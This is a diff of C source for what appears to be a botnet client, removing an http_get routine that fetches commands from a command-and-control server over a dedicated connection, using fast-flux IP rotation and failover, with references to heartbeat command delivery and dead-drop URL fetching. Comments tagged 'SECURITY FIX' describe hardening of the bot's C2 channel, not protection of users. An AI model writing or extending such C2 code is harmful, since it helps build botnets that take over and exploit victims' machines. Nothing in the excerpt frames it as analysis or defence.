@@ -858,88 +858,8 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
 
     return 0;
 }
-/* Forward declaration: tcp_connect_sock defined below (used by http_get). */
+/* Forward declaration: tcp_connect_sock defined below (used by http_get_url). */
 static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);
-
-int http_get(notnet_bot_t *bot, char *buf, int len) {
-    if (!bot->c2_http.connected) return -1;
-
-    /* SECURITY FIX (#47): GET runs on a dedicated fresh connection, never
-     * on the shared keep-alive POST socket. The heartbeat POST response
-     * (which carries C2 commands) is read by http_read() on the shared
-     * socket; issuing a GET on the same socket risks attributing the GET
-     * response to a pending POST response (or vice versa). A dedicated
-     * Connection: close request isolates the request/response pair. */
-    /* SECURITY FIX (#85): In flux mode connect to the current rotating
-     * C2 IP. The Host header below keeps the configured hostname so
-     * virtual-host routing on the C2 side still works. */
-    char flux_ip[INET_ADDRSTRLEN];
-    const char *host = bot->c2_http.server;
-    if (bot->flux_enabled) {
-        struct in_addr fa;
-        if (flux_pick_ip(bot, bot->c2_http.server, &fa) != 0) {
-            log_warn("HTTP: GET flux resolution failed for %s", bot->c2_http.server);
-            return -1;
-        }
-        if (!inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
-            log_warn("HTTP: GET flux IP formatting failed");
-            return -1;
-        }
-        host = flux_ip;
-    }
-
-    int sock = tcp_connect_sock(bot, host, bot->c2_http.port);
-    if (sock < 0) {
-        log_warn("HTTP: GET connect failed: %s", strerror(errno));
-        flux_mark_failed(bot, bot->c2_http.server);
-        return -1;
-    }
-
-    char req[1024];
-    int reqlen = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.1\r\n"
-        "Host: %s\r\n"
-        "User-Agent: %s\r\n"
-        "Connection: close\r\n"
-        "\r\n",
-        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
-
-    int sent = send(sock, req, reqlen, 0);
-    if (sent < 0 || sent != reqlen) {
-        log_warn("HTTP: GET send failed: %s", strerror(errno));
-        close(sock);
-        return -1;
-    }
-
-    /* Read response with 10s timeout to prevent indefinite blocking.
-     * NOTE: this is a dedicated plaintext connection (tcp_connect_sock),
-     * not the TLS-upgraded channel socket, so raw send/recv apply. */
-    int total = 0;
-    while (total < len - 1) {
-        fd_set read_fds;
-        struct timeval tv;
-        FD_ZERO(&read_fds);
-        FD_SET(sock, &read_fds);
-        tv.tv_sec = 10;
-        tv.tv_usec = 0;
-
-        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
-        if (sel <= 0) {
-            /* SECURITY FIX (#85): recv timeout — treat the active flux
-             * IP as dead and advance on the next attempt. */
-            flux_mark_failed(bot, bot->c2_http.server);
-            break;  /* timeout or error */
-        }
-
-        int received = recv(sock, buf + total, len - total - 1, 0);
-        if (received <= 0) break;
-        total += received;
-    }
-    buf[total] = '\0';
-    close(sock);
-
-    return total;
-}
 
 /* Dead-drop / arbitrary-URL fetch (#86). GET a plaintext http:// URL into
  * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
